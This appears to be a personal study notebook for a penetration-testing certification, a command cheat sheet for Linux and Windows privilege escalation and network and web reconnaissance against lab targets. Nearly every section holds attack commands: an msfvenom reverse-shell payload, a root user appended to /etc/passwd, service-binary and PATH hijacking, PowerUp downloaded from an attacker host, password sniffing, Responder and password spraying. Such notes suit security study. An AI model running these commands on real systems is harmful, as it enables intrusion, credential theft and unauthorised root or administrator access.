<a id="cpts-privesc-linux-crontabs-scheduled-tasks-ae8a4f87--crontabs-scheduled-tasks"></a>

# Crontabs (Scheduled Tasks)


1. Add new scheduled tasks/cron jobs
2. Trick them to execute a malicious software

Check if we have write privileges on these directories
```bash
ls -al /etc/cron*

crontab -l

cat /etc/crontab
ls -al /etc/cron.d
cat /var/spool/cron/crontabs/root

find / -path /proc -prune -o -type f -perm -o+w 2>/dev/null
```

Inspect cron log file for running cron jobs
```bash
grep "CRON" /var/log/syslog
```

Use pspy to do a live monitoring of running processes
```bash
./pspy32
(rmb to look at the uid to see who is running the command uid=0 is root)

./pspy64 -pf -i 1000
#(The -pf flag tells the tool to print commands and file system events and -i 1000 tells it to scan procfs every 1000ms (or every second))
```
<a id="cpts-privesc-linux-crontabs-scheduled-tasks-ae8a4f87--remember-to-cat-and-ls-al-sus-cron-jobs"></a>

## REMEMBER to cat and ls -al sus cron jobs 

If we can write to a directory called by a cron job, we can write a bash script with a reverse shell command, which should send us a reverse shell when executed.




---

<a id="cpts-privesc-linux-exposed-confidential-info-9d2298c6"></a>

<a id="cpts-privesc-linux-exposed-confidential-info-9d2298c6--exposed-confidential-info"></a>

# Exposed Confidential Info


Check environment variables
```bash
env
```

Display bash history in user home directories
```bash
cat .bashrc
```

Harvest active processes for credentials
```bash
watch -n 1 "ps -aux | grep pass"
```
(might need to wait a couple of seconds/minutes)

Tcpdump to conduct password sniffing on sockets
```bash
sudo tcpdump -i lo -A | grep "pass"
```
(might need to wait a couple of seconds/minutes)

Finding config files
```shell
find / ! -path "*/proc/*" -iname "*config*" -type f 2>/dev/null
```

Command to look for ssh private keys
```shell
ls ~/.ssh
```



<a id="cpts-privesc-linux-exposed-confidential-info-9d2298c6--wordpress-config-file-might-contain-mysql-creds-so-be-a-lookout-for-wp-configphp-use-the-command-to-fish-for-the-mysql-creds"></a>

#### Wordpress config file MIGHT contain mysql creds so be a lookout for wp-config.php (use the command to fish for the MYSQL creds)
```shell
grep 'DB_USER\|DB_PASSWORD' wp-config.php
```


---

<a id="cpts-privesc-linux-methodology-checklist-c0fa3016"></a>

<a id="cpts-privesc-linux-methodology-checklist-c0fa3016--methodology-checklist"></a>

# Methodology Checklist


1. Simple Manual Enumeration
2. SUDO Privileges
3. Privileged Groups
4. Check Write Perms to /etc/passwd
5. Check Crontabs (Scheduled Tasks)
6. SUID
7. Path abuse
8. Wildcard Abuse
9. Check Running Processes (ps -aux) / pspy64
10. Check for Vulnerable software
11. Use linpeas/unix-privesc-check
12. Credential hunting

---

<a id="cpts-privesc-linux-methodology-checklist-c0fa3016--simple-manual-enumeration"></a>

## Simple Manual Enumeration

<a id="cpts-privesc-linux-methodology-checklist-c0fa3016--get-logged-in-username"></a>

### Get logged in username
```bash
whoami
```

<a id="cpts-privesc-linux-methodology-checklist-c0fa3016--get-id-of-logged-in-user"></a>

### Get id of logged in user
```bash
id
```

<a id="cpts-privesc-linux-methodology-checklist-c0fa3016--enumerate-users-on-the-system"></a>

### Enumerate users on the system
```bash
cat /etc/passwd
ls -al /etc/passwd
```

<a id="cpts-privesc-linux-methodology-checklist-c0fa3016--check-hostname"></a>

### Check Hostname
```bash
hostname
```

<a id="cpts-privesc-linux-methodology-checklist-c0fa3016--operating-system-release-and-version"></a>

### Operating system release and version
```bash
cat /etc/issue
cat /etc/os-release
uname -a
```

<a id="cpts-privesc-linux-methodology-checklist-c0fa3016--enumerate-system-processes"></a>

### Enumerate system processes
```bash
ps aux
```

<a id="cpts-privesc-linux-methodology-checklist-c0fa3016--look-at-ip"></a>

### Look at ip
```bash
ifconfig
ip a
```

<a id="cpts-privesc-linux-methodology-checklist-c0fa3016--look-at-all-active-connections"></a>

### Look at all active connections
```bash
ss -anp
```

<a id="cpts-privesc-linux-methodology-checklist-c0fa3016--find-writable-directories"></a>

### Find writable directories
```bash
find / -writable -type d 2>/dev/null
```

<a id="cpts-privesc-linux-methodology-checklist-c0fa3016--check-mounted-filesystems-and-available-disks"></a>

### Check mounted filesystems and available disks
```bash
cat /etc/fstab
mount
lsblk
```

<a id="cpts-privesc-linux-methodology-checklist-c0fa3016--finding-history-files"></a>

### Finding History Files
```shell
find / -type f \( -name *_hist -o -name *_history \) -exec ls -l {} \; 2>/dev/null
```

<a id="cpts-privesc-linux-methodology-checklist-c0fa3016--find-running-proc"></a>

### Find running proc
```shell
find /proc -name cmdline -exec cat {} \; 2>/dev/null | tr " " "\n"
```

<a id="cpts-privesc-linux-methodology-checklist-c0fa3016--installed-packages"></a>

### Installed packages
```shell
apt list --installed | tr "/" " " | cut -d" " -f1,3 | sed 's/[0-9]://g' | tee -a installed_pkgs.list
```

<a id="cpts-privesc-linux-methodology-checklist-c0fa3016--binaries"></a>

### Binaries
```shell
ls -l /bin /usr/bin/ /usr/sbin/
```

<a id="cpts-privesc-linux-methodology-checklist-c0fa3016--automated-gtfobins-checker"></a>

### Automated GTFOBINS checker
```shell
for i in $(curl -s https://gtfobins.github.io/ | html2text | cut -d" " -f1 | sed '/^[[:space:]]*$/d');do if grep -q "$i" installed_pkgs.list;then echo "Check GTFO for: $i";fi;done
```

<a id="cpts-privesc-linux-methodology-checklist-c0fa3016--trace-system-calls"></a>

### Trace system calls
```shell
strace ping -c1 10.129.112.20
```

<a id="cpts-privesc-linux-methodology-checklist-c0fa3016--find-config-files"></a>

### Find config files
```shell
find / -type f \( -name *.conf -o -name *.config \) -exec ls -l {} \; 2>/dev/null
```

<a id="cpts-privesc-linux-methodology-checklist-c0fa3016--find-scripts"></a>

### Find scripts
```shell
find / -type f -name "*.sh" 2>/dev/null | grep -v "src\|snap\|share"
```


---

<a id="cpts-privesc-linux-os-and-kernel-exploits-0610e3eb"></a>

<a id="cpts-privesc-linux-os-and-kernel-exploits-0610e3eb--os-and-kernel-exploits"></a>

# OS and Kernel Exploits

Check operating system version number using searchsploit or google

```bash
uname -a
cat /etc/os-release
cat /etc/issue
arch

searchsploit 3.9.0-73-generic
```

<a id="cpts-privesc-linux-os-and-kernel-exploits-0610e3eb--can-check-linpeas-as-well"></a>

## Can check linpeas as well


---

<a id="cpts-privesc-linux-path-abuse-b5a507cc"></a>

<a id="cpts-privesc-linux-path-abuse-b5a507cc--path-abuse"></a>

# Path Abuse


<a id="cpts-privesc-linux-path-abuse-b5a507cc--echo-the-path-and-check-for-any-sus-directories-in-the-path"></a>

### Echo the path and check for any sus directories in the path
```shell
echo $PATH
```

Next check if we can modify the path environment variable, if yes we can exploit this
```shell
PATH=.:${PATH}
export PATH
echo $PATH

# make a new file in the current directory like ls and put malicious content
touch ls
echo 'echo "PATH ABUSE!!"' > ls
chmod +x ls
ls
```


---

<a id="cpts-privesc-linux-suid-sticky-bit-a4af3b7a"></a>

<a id="cpts-privesc-linux-suid-sticky-bit-a4af3b7a--suid-sticky-bit"></a>

# SUID Sticky Bit


Look for sticky bit commands
```bash
find / -perm -u=s -type f 2>/dev/null
find / -user root -perm -4000 -exec ls -ldb {} \; 2>/dev/null
find / -user root -perm -6000 -exec ls -ldb {} \; 2>/dev/null
```

Suspicious binary with the flag hiding inside
```bash
strings /usr/bin/passwd_flag
cat /usr/bin/passwd_flag
```

If not then go https://gtfobins.github.io/




Enumerate capabilities using getcap
```bash
/usr/sbin/getcap -r / 2>/dev/null
find /usr/bin /usr/sbin /usr/local/bin /usr/local/sbin -type f -exec getcap {} \;
```
![Pasted image 20250529150333.png](cpts/assets/Pasted%20image%2020250529150333.png)

If there are any sus binaries just search https://gtfobins.github.io/



---

<a id="cpts-privesc-linux-write-perms-to-etc-passwd-8d41f403"></a>

<a id="cpts-privesc-linux-write-perms-to-etc-passwd-8d41f403--write-perms-to-etc-passwd"></a>

# Write perms to etc passwd


<a id="cpts-privesc-linux-write-perms-to-etc-passwd-8d41f403--try-to-remove-the-x-in-the-root-password-first"></a>

## Try to remove the x in the root password first

<a id="cpts-privesc-linux-write-perms-to-etc-passwd-8d41f403--try-adding-new-user-instead-if-the-above-doesnt-succeed"></a>

## Try adding new user instead if the above doesn't succeed

```bash
openssl passwd w00t
echo "root2:Fdzt.eqJQ4s0g:0:0:root:/root:/bin/bash" >> /etc/passwd
su root2
```


---

<a id="cpts-privesc-windows-admin-user-with-no-admin-privileges-19acc37f"></a>

<a id="cpts-privesc-windows-admin-user-with-no-admin-privileges-19acc37f--admin-user-with-no-admin-privileges"></a>

# Admin user with no admin privileges

- Bypass UAC 


---

<a id="cpts-privesc-windows-dll-hijacking-3a400c32"></a>

<a id="cpts-privesc-windows-dll-hijacking-3a400c32--dll-hijacking"></a>

# DLL Hijacking


<a id="cpts-privesc-windows-dll-hijacking-3a400c32--dll-search-order-for-windows-machines-safedll-search"></a>

##### DLL Search order for Windows Machines (SafeDLL Search)
```
1. The directory from which the application loaded.
2. The system directory.
3. The 16-bit system directory.
4. The Windows directory. 
5. The current directory.
6. The directories that are listed in the PATH environment variable.
```

Get a list of installed applications
```powershell
Get-ItemProperty "HKLM:\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*" | select displayname
```

Search up google/searchsploit for potential sus programs for DLL hijacking

Check for write privileges in the programs directories (just echo txt file)


---

<a id="cpts-privesc-windows-exposed-credentials-09889ee3"></a>

<a id="cpts-privesc-windows-exposed-credentials-09889ee3--exposed-credentials"></a>

# Exposed Credentials


```
history (linux)

PSReadLine (Windows)
Get-History
(Get-PSReadlineOption).HistorySavePath
type history.txt
```

<a id="cpts-privesc-windows-exposed-credentials-09889ee3--windows"></a>

#### Windows
```powershell
#Search for stored passwords
Get-ChildItem -Path C:\ -Include *.kdbx -File -Recurse -ErrorAction SilentlyContinue
Get-ChildItem -Path C:\ -Include *.txt,*.ini -File -Recurse -ErrorAction SilentlyContinue
Get-ChildItem -Path C:\ -Include *.txt,*.pdf,*.xls,*.xlsx,*.doc,*.docx -File -Recurse -ErrorAction SilentlyContinue
```

```cmd
findstr /si password *.txt *.ini *.config*
```



---

<a id="cpts-privesc-windows-methodology-checklist-32314143"></a>

<a id="cpts-privesc-windows-methodology-checklist-32314143--methodology-checklist"></a>

# Methodology Checklist


1. Vulnerable programs
2. SeimpersonatePrivilege
3. Unquoted Service Path
4. Service Binary Hijacking
5. DLL hijacking
6. Scheduled tasks
7. Mimikatz/Winpeas


---
<a id="cpts-privesc-windows-methodology-checklist-32314143--manual-enumeration"></a>

## Manual Enumeration

<a id="cpts-privesc-windows-methodology-checklist-32314143--get-system-information"></a>

### Get System Information
```cmd
systeminfo
```

<a id="cpts-privesc-windows-methodology-checklist-32314143--check-hostname"></a>

### Check Hostname
```cmd
hostname
```

<a id="cpts-privesc-windows-methodology-checklist-32314143--patches-already-implemented-on-system"></a>

### Patches already implemented on system
```cmd
wmic qfe
wmic qfe get Caption,Description,HotFixID,InstalledOn

wmic logicaldisk get caption,description,providername
```

<a id="cpts-privesc-windows-methodology-checklist-32314143--check-whoami-and-privileges-that-we-have"></a>

### Check whoami and privileges that we have
```cmd
whoami
whoami /priv
whoami /groups
```

<a id="cpts-privesc-windows-methodology-checklist-32314143--enumerate-for-existing-user-accounts"></a>

### Enumerate for existing user accounts
```cmd
net user
net user bob
```

<a id="cpts-privesc-windows-methodology-checklist-32314143--enumerate-groups"></a>

### Enumerate Groups
```cmd
net localgroup
net localgroup administrators
```

<a id="cpts-privesc-windows-methodology-checklist-32314143--enumerate-exposed-credentials"></a>

### Enumerate exposed credentials

import-module .\PowerView.ps1\


---

<a id="cpts-privesc-windows-scheduled-tasks-2dc078d8"></a>

<a id="cpts-privesc-windows-scheduled-tasks-2dc078d8--scheduled-tasks"></a>

# Scheduled Tasks

Get a list of all the scheduled tasks on the system
```powershell
schtasks /query /fo LIST /v
```

Use icacls to check permissions on the executable
```powershell
icacls C:\Users\steve\Pictures\BackendCacheCleanup.exe
```

Then just msfvenom to create the reverse shell and upload it as the new executable
```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.45.235 LPORT=4444 -f exe -o reverse.exe
```


---

<a id="cpts-privesc-windows-service-binary-hijacking-ada39c1a"></a>

<a id="cpts-privesc-windows-service-binary-hijacking-ada39c1a--service-binary-hijacking"></a>

# Service Binary Hijacking


Get a list of all installed windows services
```powershell
Get-CimInstance -ClassName win32_service | Select Name,Startname,State,PathName | Where-Object {$_.State -like 'Running'}
```

Check permissions on a binary
```powershell
icacls "C:\xampp\apache\bin\httpd.exe"
```

Stopping a service
```powershell
net stop mysql
```

Check if service starts on boot
```powershell
Get-CimInstance -ClassName win32_service | Select Name, StartMode | Where-Object {$_.Name -like 'mysql'}

#if the service is set to auto check privileges
whoami /priv

# RMB TO MOVE THE SERVICE FILE OUT FIRST BEFORE MOVING THE REVSHELL IN
PS C:\Users\Public> move C:\xampp\mysql\bin\mysqld.exe mysqld.exe
PS C:\Users\Public> move reverse.exe C:\xampp\mysql\bin\mysqld.exe

#if SeShutDownPrivilege
shutdown /r /t 0
```

Use PowerUp.ps1 to check for modifiable service files
```powershell
iwr -uri http://192.168.48.3/PowerUp.ps1 -Outfile PowerUp.ps1
powershell -ep bypass
. .\PowerUp.ps1
Invoke-AllChecks
Get-ModifiableServiceFile


#if the file is directly abusable we can just run this
Install-ServiceBinary -Name 'mysql'
#this will create a user john:Password123! and add to local administrator group. However, do rememeber to further manually enumerate as this is not 100%.
```

Use sc.exe in powershell to start/stop a service
```powershell
sc.exe qc auditTracker

sc.exe start auditTracker
sc.exe stop auditTracker
```


---

<a id="cpts-privesc-windows-services-automatically-started-on-boot-769440ef"></a>

<a id="cpts-privesc-windows-services-automatically-started-on-boot-769440ef--services-automatically-started-on-boot"></a>

# Services Automatically Started on Boot


Trial command

```cmd
wmic service get name,displayname,pathname,startmode |findstr /i "auto" 
|findstr /i /v "c:\windows\\" |findstr /i /v """ 
```


---

<a id="cpts-privesc-windows-unquoted-service-paths-53b627a0"></a>

<a id="cpts-privesc-windows-unquoted-service-paths-53b627a0--unquoted-service-paths"></a>

# Unquoted Service Paths

Look out for sus programs that have spaces in their directory

The terminal looks for the executable is this sequence
```cmd
C:\Program.exe
C:\Program Files\A.exe
C:\Program Files\A Files\B.exe

net stop service
net start service

#only if above is not possible then check for reboot perms
shutdown /r /t 0
```

Checking for write privileges to a folder
```cmd
icacls C:\Users\nur
```

Find possible unquoted service paths
```cmd
wmic service get name,pathname,displayname,startmode |  findstr /i /v "C:\Windows\\" | findstr /i /v """
```
(RUN IN CMD ONLY)

<a id="cpts-privesc-windows-unquoted-service-paths-53b627a0--powerupps1"></a>

#### PowerUp.ps1
```powershell
iwr http://192.168.45.202/PowerUp.ps1 -Outfile PowerUp.ps1
powershell -ep bypass
. .\PowerUp.ps1
Get-UnquotedService

# auto exploit creating user john:Password123!
Write-ServiceBinary -Name 'GammaService' -Path "C:\Program Files\Enterprise Apps\Current.exe"
```


---

<a id="cpts-reconnaissance-ad-reconnaissance-cbb23af1"></a>

<a id="cpts-reconnaissance-ad-reconnaissance-cbb23af1--ad-reconnaissance"></a>

# AD Reconnaissance


Wireshark
```shell-session
sudo -E wireshark
```

Tcpdump
```shell-session
sudo tcpdump -i ens224
```

Responder
```bash
sudo responder -I ens224 -A 
```

Fping active checks
```shell-session
fping -asgq 172.16.5.0/23
```

Internal AD username enumeration
```shell-session
kerbrute userenum -d INLANEFREIGHT.LOCAL --dc 172.16.5.5 jsmith.txt -o valid_ad_users
```



---

<a id="cpts-reconnaissance-cloud-resources-836ba495"></a>

<a id="cpts-reconnaissance-cloud-resources-836ba495--cloud-resources"></a>

# Cloud Resources

Use `inurl:` and `intext`: to search for possible cloud domains owned by the company
![Pasted image 20250326172013.png](cpts/assets/Pasted%20image%2020250326172013.png)
<a id="cpts-reconnaissance-cloud-resources-836ba495--check-main-websites-source-code-for-potential-hrefs"></a>

#### Check main website's source code for potential hrefs
![Pasted image 20250326173144.png](cpts/assets/Pasted%20image%2020250326173144.png)

<a id="cpts-reconnaissance-cloud-resources-836ba495--online-tools"></a>

#### Online Tools
- https://domain.glass/
- https://buckets.grayhatwarfare.com/


---

<a id="cpts-reconnaissance-domain-discovery-d1213c29"></a>

<a id="cpts-reconnaissance-domain-discovery-d1213c29--domain-discovery"></a>

# Domain Discovery

1. Check SSL Certificate of Company's main website
2. Use https://crt.sh to look up for subdomains

<a id="cpts-reconnaissance-domain-discovery-d1213c29--curl"></a>

#### CURL
```bash
curl -s https://crt.sh/\?q\=inlanefreight.com\&output\=json | jq . | grep name | cut -d":" -f2 | grep -v "CN=" | cut -d'"' -f2 | awk '{gsub(/\\n/,"\n");}1;' | sort -u
```
```bash
for i in $(cat subdomainlist);do host $i | grep "has address" | grep inlanefreight.com | cut -d" " -f1,4;done
```
(checks which domains are accessible on the internet)

<a id="cpts-reconnaissance-domain-discovery-d1213c29--shodan"></a>

#### Shodan
```shell
vernonlim03@htb[/htb]$ for i in $(cat subdomainlist);do host $i | grep "has address" | grep inlanefreight.com | cut -d" " -f4 >> ip-addresses.txt;done
vernonlim03@htb[/htb]$ for i in $(cat ip-addresses.txt);do shodan host $i;done
```

<a id="cpts-reconnaissance-domain-discovery-d1213c29--checking-dns-records"></a>

#### Checking DNS Records
```shell
dig any inlanefreight.com
```


---

<a id="cpts-reconnaissance-host-discovery-a202aa9e"></a>

<a id="cpts-reconnaissance-host-discovery-a202aa9e--host-discovery"></a>

# Host Discovery

nmap
```bash
sudo nmap 10.129.2.0/24 -sn -oA tnet | grep for | cut -d" " -f5
```



---

<a id="cpts-reconnaissance-password-hunting-d3163f7e"></a>

<a id="cpts-reconnaissance-password-hunting-d3163f7e--password-hunting"></a>

# Password Hunting

<a id="cpts-reconnaissance-password-hunting-d3163f7e--cewl-generate-passwords-on-a-website"></a>

### CeWL (generate passwords on a website)

```shell
cewl https://www.inlanefreight.com -d 4 -m 6 --lowercase -w inlane.wordlist
wc -l inlane.wordlist
```

- -d  (to specify the depth to spider)
- -m (to specify minimum length of the word)
- -w (store results where)

<a id="cpts-reconnaissance-password-hunting-d3163f7e--hashcat-mutate-passwords-based-on-custom-rule"></a>

## HashCat (mutate passwords based on custom rule)

```shell
hashcat --force password.list -r custom.rule --stdout | sort -u > mut_password.list
```



<a id="cpts-reconnaissance-password-hunting-d3163f7e--default-credentials-csv-dump"></a>

## Default Credentials - CSV DUMP
<https://github.com/ihebski/DefaultCreds-cheat-sheet/blob/main/DefaultCreds-Cheat-Sheet.csv>


---

<a id="cpts-reconnaissance-username-discovery-3e712759"></a>

<a id="cpts-reconnaissance-username-discovery-3e712759--username-discovery"></a>

# Username Discovery


<a id="cpts-reconnaissance-username-discovery-3e712759--common-username-conventions"></a>

### Common Username conventions
![Pasted image 20250429140747.png](cpts/assets/Pasted%20image%2020250429140747.png)

<a id="cpts-reconnaissance-username-discovery-3e712759--use-username-anarchy-to-create-a-possible-list"></a>

### Use Username Anarchy to create a possible list
```shell
./cpts-tools/username-anarchy/username-anarchy -i /home/ltnbob/names.txt 
```

Then spray it with netexec
```shell
netexec smb 10.129.201.57 -u bwilliamson -p /usr/share/wordlists/fasttrack.txt
```


---

<a id="cpts-reconnaissance-web-reconnaissance-2c284fa9"></a>

<a id="cpts-reconnaissance-web-reconnaissance-2c284fa9--web-reconnaissance"></a>

# Web Reconnaissance


| Technique               | Description                                                                 | Example                                                                                                      | Tools                                                                 | Risk of Detection                                                                 |
|-------------------------|-----------------------------------------------------------------------------|--------------------------------------------------------------------------------------------------------------|----------------------------------------------------------------------|-----------------------------------------------------------------------------------|
| Port Scanning           | Identifying open ports and services running on the target.                  | Using Nmap to scan a web server for open ports like 80 (HTTP) and 443 (HTTPS).                               | Nmap, Masscan, Unicornscan                                           | High: Direct interaction with the target can trigger intrusion detection systems (IDS) and firewalls. |
| Vulnerability Scanning  | Probing for known vulnerabilities (outdated software/misconfigurations).    | Running Nessus against a web app to check for SQLi/XSS flaws.                                                | Nessus, OpenVAS, Nikto                                               | High: Exploit payloads may trigger security solutions.                            |
| Network Mapping         | Mapping network topology and device relationships.                          | Using traceroute to reveal network hops and infrastructure.                                                  | Traceroute, Nmap                                                     | Medium-High: Unusual traffic patterns may raise suspicion.                        |
| Banner Grabbing         | Retrieving service banner information.                                      | Connecting to port 80 to identify web server software/version.                                               | Netcat, curl                                                         | Low: Minimal interaction but may be logged.                                       |
| OS Fingerprinting       | Identifying the target's operating system.                                  | Using Nmap's -O flag to detect Windows/Linux.                                                                | Nmap, Xprobe2                                                        | Low: Generally passive, but advanced techniques may be detected.                  |
| Service Enumeration     | Determining specific service versions.                                      | Using Nmap's -sV to check for Apache 2.4.50/Nginx 1.18.0.                                                    | Nmap                                                                 | Low: Similar risk to banner grabbing.                                             |
| Web Spidering           | Crawling websites to discover pages/directories.                            | Using Burp Suite Spider to map website structure.                                                             | Burp Suite, OWASP ZAP, Scrapy                                        | Low-Medium: May trigger alerts if not mimicking human traffic.                    |
| Search Engine Queries   | Using search engines to uncover public target information.                  | Google searching "[Target] employees" for social media profiles.                                              | Google, DuckDuckGo, Shodan                                           | Very Low: Normal internet activity.                                               |
| WHOIS Lookups           | Retrieving domain registration details.                                     | Checking WHOIS records for registrant contact info.                                                           | whois command, online lookup services                                | Very Low: Legitimate DNS activity.                                                |
| DNS Analysis            | Examining DNS records for subdomains/infrastructure.                        | Using dig to enumerate target subdomains.                                                                     | dig, nslookup, dnsrecon                                              | Very Low: Essential internet function.                                            |
| Web Archive Analysis    | Reviewing historical website snapshots.                                     | Using Wayback Machine to find deleted pages.                                                                  | Wayback Machine                                                       | Very Low: Public archive access.                                                  |
| Social Media Analysis   | Gathering info from platforms like LinkedIn/Twitter.                        | Searching LinkedIn for employee roles/responsibilities.                                                       | LinkedIn, Twitter, OSINT tools                                       | Very Low: Public profile viewing.                                                 |
| Code Repository Analysis| Checking public repos for exposed data.                                     | Searching GitHub for target-related code/credentials.                                                         | GitHub, GitLab                                                       | Very Low: Normal repository browsing.                                             |

<a id="cpts-reconnaissance-web-reconnaissance-2c284fa9--whois"></a>

### WHOIS

```
whois inlanefreight.com
```


<a id="cpts-reconnaissance-web-reconnaissance-2c284fa9--dns-analysis"></a>

### DNS Analysis

<a id="cpts-reconnaissance-web-reconnaissance-2c284fa9--dig-command"></a>

###### DIG Command
```bash
#regular
dig google.com

#ptr record
dig -x google.com
```

<a id="cpts-reconnaissance-web-reconnaissance-2c284fa9--subdomain-enumeration"></a>

###### Subdomain Enumeration

- DNS Zone Transfer
- Subdomain Brute Forcing
- Certificate Transparency (CT) Logs
- Search Engines (rmb to add site: )

```bash
dig axfr inlanefreight.htb @10.129.14.128
dig axfr internal.inlanefreight.htb @10.129.14.128
```

```bash
dnsenum --enum inlanefreight.com -f /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -r
gobuster dns -d inlanefreight.com -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-20000.txt
```

<a id="cpts-reconnaissance-web-reconnaissance-2c284fa9--virtual-host-discovery"></a>

###### Virtual Host Discovery

- RMB if this doesnt work it could be an entry needs to be added in /etc/hosts

```shell
gobuster vhost -u http://inlanefreight.htb:81 -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt --append-domain
```

<a id="cpts-reconnaissance-web-reconnaissance-2c284fa9--ct-logs"></a>

###### CT Logs
<https://crt.sh>

- This command fetches the JSON output from crt.sh for certificates matching the domain facebook.com
- jq -r '.[] | select(.name_value | contains("dev")) | .name_value': This part filters the JSON results, selecting only entries where the name_value field (which contains the domain or subdomain) includes the string "dev". The -r flag tells jq to output raw strings.
- sort -u: This sorts the results alphabetically and removes duplicates.

```shell
curl -s "https://crt.sh/?q=facebook.com&output=json" | jq -r '.[]
 | select(.name_value | contains("dev")) | .name_value' | sort -u
```

<a id="cpts-reconnaissance-web-reconnaissance-2c284fa9--fingerprinting"></a>

#### Fingerprinting

<a id="cpts-reconnaissance-web-reconnaissance-2c284fa9--banner-grabbing"></a>

###### Banner Grabbing
```bash
curl -I inlanefreight.com
```

<a id="cpts-reconnaissance-web-reconnaissance-2c284fa9--wafw00f"></a>

###### Wafw00f
- Detect the precense of a WAF
```shell
wafw00f inlanefreight.com
```

<a id="cpts-reconnaissance-web-reconnaissance-2c284fa9--nikto"></a>

###### Nikto
```shell
nikto -h inlanefreight.com -Tuning b
```

<a id="cpts-reconnaissance-web-reconnaissance-2c284fa9--crawling"></a>

#### Crawling

- robots.txt
- /.well-known/
- /.well-known/openid-configuration

<a id="cpts-reconnaissance-web-reconnaissance-2c284fa9--reconspider"></a>

###### Reconspider
```bash
python3 ReconSpider.py http://inlanefreight.com
```

<a id="cpts-reconnaissance-web-reconnaissance-2c284fa9--web-archives"></a>

#### Web Archives
<https://web.archive.org>

<a id="cpts-reconnaissance-web-reconnaissance-2c284fa9--recon-automation"></a>

#### Recon Automation

```shell
./finalrecon.py --headers --whois --url http://inlanefreight.com
```

